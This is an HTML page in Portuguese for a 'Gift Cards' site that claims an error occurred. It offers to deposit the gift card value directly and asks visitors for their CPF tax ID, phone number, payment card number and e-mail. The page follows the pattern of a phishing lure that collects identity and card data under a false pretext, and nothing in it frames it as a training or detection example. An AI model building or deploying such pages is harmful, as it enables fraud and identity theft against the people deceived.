<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="src/styles/style-login.css">
    <title>Gift Cards</title>
</head>

<body>
    <header>

        <div id="loader">
            <div class="spinner"></div>
        </div>

    </header>

    <main>

        <div class="form-container">
            <h1><span>ATENÇÃO!!</span></h1>
            <h2>Parece que ocorreu um erro, mas nós podemos depositar o valor do Gift Card direto na sua conta. Por
                favor insira as informações abaixo.</h2>
            <form action="concluido.html">
                <div class="form-group">
                    <label for="cpf">CPF:</label>
                    <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
                </div>
                <div class="form-group">
                    <label for="telefone">Telefone:</label>
                    <input type="tel" id="telefone" name="telefone" placeholder="(00) 00000-0000" required>
                </div>
                <div class="form-group">
                    <label for="cartao">Número do Cartão:</label>
                    <input type="number" id="cartao" name="cartao" placeholder="0000 0000 0000 0000" required>
                </div>
                <div class="form-group">
                    <label for="email">E-mail:</label>
                    <input type="email" id="email" name="email" placeholder="exemplo@dominio.com" required>
                </div>
                <button type="submit">Enviar</button>
            </form>
        </div>

    </main>
    <footer>

    </footer>

    <script>
        // Esconde o loader após 2 segundos e mostra o conteúdo
        window.addEventListener("load", function () {
            setTimeout(() => {
                document.getElementById("loader").style.display = "none";
                document.getElementById("content").style.display = "block";
            }, 2000); // 2 segundos
        });
    </script>
</body>

</html>
